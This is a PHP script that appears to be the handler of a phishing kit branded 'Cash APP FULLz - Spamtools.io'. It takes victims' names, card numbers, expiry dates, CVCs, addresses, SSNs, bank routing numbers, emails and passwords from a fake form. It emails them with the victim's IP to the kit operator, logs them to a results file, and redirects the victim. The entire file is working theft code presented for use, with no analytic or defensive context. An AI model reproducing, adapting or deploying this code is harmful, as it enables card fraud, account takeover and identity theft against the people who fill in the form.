<?php
error_reporting(0);
include "bt.php";
include 'email.php';

$hostname = gethostbyaddr($ip);
$bilsmg = "------------[Cash APP FULLz - Spamtools.io]------------\n";
$bilsmg .= "-----------Fullz------------\n";
$bilsmg .= "First Name: ".$_POST['first-name']."\n";
$bilsmg .= "Last Name: ".$_POST['last-name']."\n";
$bilsmg .= "Card: ".$_POST['number']."\n";
$bilsmg .= "Expiry: ".$_POST['expiry']."\n";
$bilsmg .= "CVC: ".$_POST['cvc']."\n";
$bilsmg .= "Address: ".$_POST['streetaddress']."\n";
$bilsmg .= "City: ".$_POST['city']."\n";
$bilsmg .= "zipcode: ".$_POST['zipcode']."\n";
$bilsmg .= "SSN: ".$_POST['ssn']."\n";
$bilsmg .= "Routine Number: ".$_POST['rr']."\n";
$bilsmg .= "EMAIL: ".$_POST['ee']."\n";
$bilsmg .= "Password: ".$_POST['pp']."\n";


$bilsmg .= "IP: ".$ip."\n";
$bilsmg .= "------------[CashAPP Fullz]------------\n";
$bilsub = "";
$bilhead = "MIME-Version: 2.0\n";
mail($email,$bilsub,$bilsmg,$bilhead);
$fp = fopen("results/UserInfo.txt", "a+");
fwrite($fp, $bilsmg);
fclose($fp);
header("Location: emaillink.php");
?>